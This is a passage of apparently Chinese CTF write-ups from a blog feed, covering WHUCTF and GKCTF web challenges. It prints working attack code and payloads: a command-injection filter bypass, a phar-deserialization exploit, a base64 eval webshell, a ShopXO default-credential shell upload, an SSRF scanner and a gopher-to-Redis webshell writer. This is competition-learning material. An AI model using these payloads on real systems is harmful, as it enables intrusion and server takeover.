class="string">"fxck your symbol!"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">"/ /"</span>, $ip))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"no space!"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">"/.*f.*l.*a.*g.*/"</span>, $ip))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"no flag"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">"/tac|rm|echo|cat|nl|less|more|tail|head/"</span>, $ip))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"cat't read flag"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  $a = shell_exec(<span class="string">"ping -c 4 "</span>.$ip); </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;"</span>;</span><br><span class="line">  print_r($a);</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这题和GXY的pingpingping类似，但是过滤更严格一点，文件内容读取全被过滤，不过伪协议没被过滤应该可以用，我用的是GXY的payload稍作修改打的，用字符拼接绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip&#x3D;127.0.0.1;a&#x3D;g;ca\t$IFS$9fla$a.php</span><br></pre></td></tr></table></figure><p>回显ping成功了，F12发现flag</p><h4 id="Easy-unserialize"><a href="#Easy-unserialize" class="headerlink" title="Easy_unserialize"></a>Easy_unserialize</h4><p>开题，可以上传文件，试了一下，jpg，.htaccess都传不上，抓包，发现了点东西</p><img src="/2020/05/25/WHUCTF/4.png" class="" title="examplename"><p>acti0n参数在网页并没有显示出来，用伪协议读取一下源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#upload.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$dir = <span class="string">'upload/'</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]).<span class="string">'/'</span>;</span><br><span class="line"><span class="keyword">if</span>(!is_dir($dir)) &#123;</span><br><span class="line"><span class="keyword">if</span>(!mkdir($dir, <span class="number">0777</span>, <span class="keyword">true</span>)) &#123;</span><br><span class="line"><span class="keyword">echo</span> error_get_last()[<span class="string">'message'</span>];</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Failed to make the directory'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">chdir($dir);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">$name = $_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>];</span><br><span class="line">$tmp_name = $_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">$ans = exif_imagetype($tmp_name);</span><br><span class="line"><span class="keyword">if</span>($_FILES[<span class="string">'file'</span>][<span class="string">'size'</span>] &gt;= <span class="number">204800</span>) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'filesize too big.'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!$name) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'filename can not be empty!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/(htaccess)|(user)|(\.\.)|(%)|(#)/i'</span>, $name) !== <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Hacker!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(($ans != IMAGETYPE_GIF) &amp;&amp; ($ans != IMAGETYPE_JPEG) &amp;&amp; ($ans != IMAGETYPE_PNG)) &#123;</span><br><span class="line">$type = $_FILES[<span class="string">'file'</span>][<span class="string">'type'</span>];</span><br><span class="line"><span class="keyword">if</span>($type == <span class="string">'image/gif'</span> <span class="keyword">or</span> $type == <span class="string">'image/jpg'</span> <span class="keyword">or</span> $type == <span class="string">'image/png'</span> <span class="keyword">or</span> $type == <span class="string">'image/jpeg'</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p align=\"center\"&gt;Don't cheat me with Content-Type!&lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">"&lt;p align=\"center\"&gt;You can't upload this kind of file!&lt;/p&gt;"</span>);</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">$content = file_get_contents($tmp_name);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/(scandir)|(end)|(implode)|(eval)|(system)|(passthru)|(exec)|(chroot)|(chgrp)|(chown)|(shell_exec)|(proc_open)|(proc_get_status)|(ini_alter)|(ini_set)|(ini_restore)|(dl)|(pfsockopen)|(symlink)|(popen)|(putenv)|(syslog)|(readlink)|(stream_socket_server)|(error_log)/i'</span>, $content) !== <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">'&lt;script&gt;alert("You could not upload this image because of some dangerous code in your file!")&lt;/script&gt;'</span>);</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$extension = substr($name, strrpos($name, <span class="string">"."</span>) + <span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/(png)|(jpg)|(jpeg)|(phar)|(gif)|(txt)|(md)|(exe)/i'</span>, $extension) === <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"&lt;p align=\"center\"&gt;You can't upload this kind of file!&lt;/p&gt;"</span>);</span><br><span class="line">&#125; </span><br><span class="line">$upload_file = $name;</span><br><span class="line">move_uploaded_file($tmp_name, $upload_file);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(file_exists($name)) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p align=\"center\"&gt;Your file $name has been uploaded.&lt;br&gt;&lt;/p&gt;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;script&gt;alert("ä¸ä¼ å¤±è´¥")&lt;/script&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p align=\"center\"&gt;&lt;a href=\"view.php\" &gt;ç¹æå»çä¸ä¼ çæä»¶&lt;/a&gt;&lt;/p&gt;"</span>;</span><br><span class="line"><span class="comment">#header("refresh:3;url=index.php");</span></span><br><span class="line">&#125;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>禁用了很多命令执行函数，不能传.htaccess，不能改content-type字段，不能传包含一句话的图片码，google，再想到题目是反序列化，想到之前碰到过的phar文件格式上传</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#view.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#include_once "flag.php"; </span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">View</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $dir;</span><br><span class="line"><span class="keyword">private</span> $cmd;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;dir = <span class="string">'upload/'</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]).<span class="string">'/'</span>;</span><br><span class="line"><span class="keyword">$this</span>-&gt;cmd = <span class="string">'echo "&lt;div style=\"text-align: center;position: absolute;left: 0;bottom: 0;width: 100%;height: 30px;\"&gt;Powered by: xxx&lt;/div&gt;";'</span>;</span><br><span class="line"><span class="keyword">if</span>(!is_dir(<span class="keyword">$this</span>-&gt;dir)) &#123;</span><br><span class="line">mkdir(<span class="keyword">$this</span>-&gt;dir, <span class="number">0777</span>, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_file_list</span><span class="params">()</span> </span>&#123;</span><br><span class="line">$file = scandir(<span class="string">'.'</span>);</span><br><span class="line"><span class="keyword">return</span> $file;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show_file_list</span><span class="params">()</span> </span>&#123;</span><br><span class="line">$file = <span class="keyword">$this</span>-&gt;get_file_list();</span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">2</span>; $i &lt; sizeof($file); $i++) &#123; </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p align=\"center\" style=\"font-weight: bold;\"&gt;["</span>.strval($i - <span class="number">1</span>).<span class="string">"]  $file[$i] &lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show_img</span><span class="params">($file_name)</span> </span>&#123;</span><br><span class="line">$name = $file_name;</span><br><span class="line">$width = getimagesize($name)[<span class="number">0</span>];</span><br><span class="line">$height = getimagesize($name)[<span class="number">1</span>];</span><br><span class="line">$times = $width / <span class="number">200</span>;</span><br><span class="line">$width /= $times;</span><br><span class="line">$height /= $times;</span><br><span class="line">$template = <span class="string">"&lt;img style=\"clear: both;display: block;margin: auto;\" src=\"$this-&gt;dir$name\" alt=\"$file_name\" width = \"$width\" height = \"$height\"&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> $template;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">delete_img</span><span class="params">($file_name)</span> </span>&#123;</span><br><span class="line">$name = $file_name;</span><br><span class="line"><span class="keyword">if</span> (file_exists($name)) &#123;</span><br><span class="line">@unlink($name);</span><br><span class="line"><span class="keyword">if</span>(!file_exists($name)) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p align=\"center\" style=\"font-weight: bold;\"&gt;æåå é¤! 3såè·³è½¬&lt;/p&gt;"</span>;</span><br><span class="line">header(<span class="string">"refresh:3;url=view.php"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Can not delete!"</span>;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p align=\"center\" style=\"font-weight: bold;\"&gt;æ¾ä¸å°è¿ä¸ªæä»¶! &lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;cmd);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ins = <span class="keyword">new</span> View();</span><br><span class="line">chdir($ins-&gt;dir);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h3&gt;å½åç®å½ä¸º "</span> . $ins-&gt;dir . <span class="string">"&lt;/h3&gt;"</span>;</span><br><span class="line">$ins-&gt;show_file_list();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'show'</span>])) &#123;</span><br><span class="line">$file_name = $_POST[<span class="string">'show'</span>];</span><br><span class="line">$ins-&gt;show_img($file_name);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'delete'</span>])) &#123;</span><br><span class="line">$file_name = $_POST[<span class="string">'delete'</span>];</span><br><span class="line">$ins-&gt;delete_img($file_name);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">unset</span>($ins);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>利用点就在这了，__destruct魔术方法会把$this-&gt;cmd打印到php文件中，可控</p><p>这里注意到后面要POST传参给show进行打印文件内容</p><p>下面是exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">View</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $dir;</span><br><span class="line"><span class="keyword">private</span> $cmd=<span class="string">"show_source(\"/var/www/html/flag.php\");"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="keyword">new</span> View();</span><br><span class="line">@unlink(<span class="string">"phar.phar"</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"5.phar"</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"GIF89a"</span>.<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>);</span><br><span class="line">$phar-&gt;setMetadata($a);</span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.jpg"</span>, <span class="string">"test"</span>);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><p>生成phar文件之后直接传上去，post一下</p><img src="/2020/05/25/WHUCTF/5.png" class="" title="examplename">]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;Easy-sqli&quot;&gt;&lt;a href=&quot;#Easy-sqli&quot; class=&quot;headerlink&quot; title=&quot;Easy_sqli&quot;&gt;&lt;/a&gt;Easy_sqli&lt;/h4&gt;
    
    </summary>
    
    
    
      <category term="WHUCTF" scheme="http://yoursite.com/tags/WHUCTF/"/>
    
  </entry>
  
  <entry>
    <title>GKCTF</title>
    <link href="http://yoursite.com/2020/05/24/GKCTF/"/>
    <id>http://yoursite.com/2020/05/24/GKCTF/</id>
    <published>2020-05-24T13:52:49.000Z</published>
    <updated>2020-05-27T06:32:26.310Z</updated>
    
    <content type="html"><![CDATA[<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><p>前言：</p><a id="more"></a><p>这次比赛可以说打的挺糟糕吧，没有做出来的web，还是积累的不够，做的题不够多，仍需努力啊！下面是赛后复现，不多说，开整！</p><h4 id="GKCTF2020-CheckIN"><a href="#GKCTF2020-CheckIN" class="headerlink" title="[GKCTF2020]CheckIN"></a>[GKCTF2020]CheckIN</h4><p>开题给了源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;title&gt;Check_In&lt;/title&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClassName</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $code = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">public</span> $decode = <span class="keyword">null</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;code = @<span class="keyword">$this</span>-&gt;x()[<span class="string">'Ginkgo'</span>];</span><br><span class="line">                <span class="keyword">$this</span>-&gt;decode = @base64_decode( <span class="keyword">$this</span>-&gt;code );</span><br><span class="line">                @<span class="keyword">Eval</span>(<span class="keyword">$this</span>-&gt;decode);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">x</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> $_REQUEST;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">new</span> ClassName();</span><br></pre></td></tr></table></figure><p>审计代码,给Ginkgo以GET或者POST的方式传递base64加密过的语句，会通过eval打印出来，就成了php中可执行的语句，通过这个方法可以写入一句话getshell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?Ginkgo&#x3D;ZXZhbCgkX1BPU1RbJ2NtZCddKTs&#x3D;</span><br></pre></td></tr></table></figure><img src="/2020/05/24/GKCTF/1.png" class="" title="examplename"><p>可以看到disable_function中禁用了很多执行函数，跟之前的一道RCEME很像，蚁剑连一下，根目录下有flag和readflag，但是不能读，尝试用插件绕过，没有用</p><p>找别的师傅拿了一个绕php7.3disable_function的文件(ps:比赛找资料的能力太菜了23333)</p><p>可以把那个文件上传到tmp目录下（tmp目录是可传的，之前并不知道，太菜）</p><p>然后再包含一下这个文件的所在路径，get到flag</p><img src="/2020/05/24/GKCTF/2.png" class="" title="examplename"><h4 id="GKCTF2020-老八小超市儿"><a href="#GKCTF2020-老八小超市儿" class="headerlink" title="[GKCTF2020]老八小超市儿"></a>[GKCTF2020]老八小超市儿</h4><p>打开是shopxo商城，google一下，找到了一篇文章讲shopxo后台获取shell的文章[附上链接：<a href="http://www.nctry.com/1660.html]" target="_blank" rel="noopener">http://www.nctry.com/1660.html]</a></p><p>访问admin.php页面，默认登录用户名和密码是admin和shopxo</p><p>在后台下载默认主题，把自己的🐎放在default_static_ 目录下，再在后台找到网站管理-主题管理-主题安装，shell就成功上传了，访问地址：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xxx.com&#x2F;public&#x2F;static&#x2F;index&#x2F;default&#x2F;xxx.php</span><br></pre></td></tr></table></figure><p>蚁剑连接，根目录下有flag和readflag，得到提示</p><p>true_flag_in_/root</p><p>先看一下进程，pa aux(有时间总结一下linux一些不熟悉的命令)</p><p>读取一下auto.sh,发现py文件，读取</p><img src="/2020/05/24/GKCTF/3.png" class="" title="examplename"><p>这个python文件会把某些内容写入到flag.hint中，我们只要修改一下就能拿到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">os.system(<span class="string">"whoami"</span>)</span><br><span class="line">gk1=str(time.ctime())</span><br><span class="line">gk=<span class="string">"\nGet The RooT,The Date Is Useful!"</span></span><br><span class="line">f=io.open(<span class="string">"/flag.hint"</span>, <span class="string">"rb+"</span>)</span><br><span class="line">s=os.popen(<span class="string">'cat /root/flag'</span>).read()</span><br><span class="line">f.write(str(s))</span><br><span class="line">f.write(str(gk1))</span><br><span class="line">f.write(str(gk))</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>等待60s，在flag.hint找到flag</p><h4 id="GKCTF2020-cve版签到"><a href="#GKCTF2020-cve版签到" class="headerlink" title="[GKCTF2020]cve版签到"></a>[GKCTF2020]cve版签到</h4><p>打开题目有一个链接，点击，没有发现什么有用的东西，根据hint，cve-2020-7066，google，发现这个漏洞用的就是%00截断，看了别的师傅说和昨天bjd的考点类似，可惜也没做出来，修改一下访问的url</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url&#x3D;http:&#x2F;&#x2F;127.0.0.1%00.ctfhub.com</span><br></pre></td></tr></table></figure><img src="/2020/05/24/GKCTF/4.png" class="" title="examplename"><p>这里有提示，host必须要end with 123</p><p>继续修改，得到flag</p><img src="/2020/05/24/GKCTF/5.png" class="" title="examplename"><h4 id="GKCTF2020-EZ三剑客-EzWeb"><a href="#GKCTF2020-EZ三剑客-EzWeb" class="headerlink" title="[GKCTF2020]EZ三剑客-EzWeb"></a>[GKCTF2020]EZ三剑客-EzWeb</h4><p>开题，在页面源码处找到提示，访问?secret</p><img src="/2020/05/24/GKCTF/6.png" class="" title="examplename"><p>可以看到addr是173.235.107.10,ssrf探测内网，写个脚本跑一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"> </span><br><span class="line">ip = <span class="string">'173.235.107.&#123;&#125;'</span></span><br><span class="line">url = <span class="string">'http://99f58bf3-0950-499e-9f50-cdeeb37d306d.node3.buuoj.cn'</span></span><br><span class="line">temp = <span class="string">"&#123;0&#125;/index.php?url=&#123;1&#125;&amp;submit=%E6%8F%90%E4%BA%A4"</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">255</span>):</span><br><span class="line">    u = temp.format(url, ip.format(i))</span><br><span class="line">    resp = requests.get(u)</span><br><span class="line">    <span class="keyword">if</span> len(resp.content) != <span class="number">445</span>:</span><br><span class="line">        print(i)</span><br><span class="line">//跑出来的结果不唯一，挨个试一下，试出来是<span class="number">11</span></span><br></pre></td></tr></table></figure><p>提交，提示端口，可以用脚本来跑，也可以用burp，端口是6379</p><p>redis</p><p>构造gophar:getshell脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">protocol=<span class="string">"gopher://"</span></span><br><span class="line"></span><br><span class="line">ip=<span class="string">"173.235.107.11"</span></span><br><span class="line"></span><br><span class="line">port=<span class="string">"6379"</span></span><br><span class="line"></span><br><span class="line">shell=<span class="string">"\n\n&lt;?php system(\"cat /flag\");?&gt;\n\n"</span></span><br><span class="line"></span><br><span class="line">filename=<span class="string">"shell.php"</span></span><br><span class="line"></span><br><span class="line">path=<span class="string">"/var/www/html"</span></span><br><span class="line"></span><br><span class="line">passwd=<span class="string">""</span></span><br><span class="line"></span><br><span class="line">cmd=[<span class="string">"flushall"</span>,</span><br><span class="line"></span><br><span class="line">     <span class="string">"set 1 &#123;&#125;"</span>.format(shell.replace(<span class="string">" "</span>,<span class="string">"$&#123;IFS&#125;"</span>)),</span><br><span class="line"></span><br><span class="line">     <span class="string">"config set dir &#123;&#125;"</span>.format(path),</span><br><span class="line"></span><br><span class="line">     <span class="string">"config set dbfilename &#123;&#125;"</span>.format(filename),</span><br><span class="line"></span><br><span class="line">     <span class="string">"save"</span></span><br><span class="line"></span><br><span class="line">     ]</span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">    cmd.insert(<span class="number">0</span>,<span class="string">"AUTH &#123;&#125;"</span>.format(passwd))</span><br><span class="line">payload=protocol+ip+<span class="string">":"</span>+port+<span class="string">"/_"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">redis_format</span><span class="params">(arr)</span>:</span></span><br><span class="line">    CRLF=<span class="string">"\r\n"</span></span><br><span class="line">    redis_arr = arr.split(<span class="string">" "</span>)</span><br><span class="line">    cmd=<span class="string">""</span></span><br><span class="line">    cmd+=<span class="string">"*"</span>+str(len(redis_arr))</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">        cmd+=CRLF+<span class="string">"$"</span>+str(len((x.replace(<span class="string">"$&#123;IFS&#125;"</span>,<span class="string">" "</span>))))+CRLF+x.replace(<span class="string">"$&#123;IFS&#125;"</span>,<span class="string">" "</span>)</span><br><span class="line">    cmd+=CRLF</span><br><span class="line">    <span class="keyword">return</span> cmd</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">        payload += urllib.quote(redis_format(x))</span><br><span class="line">    <span class="keyword">print</span> payload</span><br><span class="line"><span class="comment">#########################################################################################</span></span><br><span class="line">gopher://<span class="number">173.235</span><span class="number">.107</span><span class="number">.11</span>:<span class="number">6379</span>/_%<span class="number">2</span>A1%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">248</span>%<span class="number">0</span>D%<span class="number">0</span>Aflushall%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">2</span>A3%<span class="number">0</span>D%<span 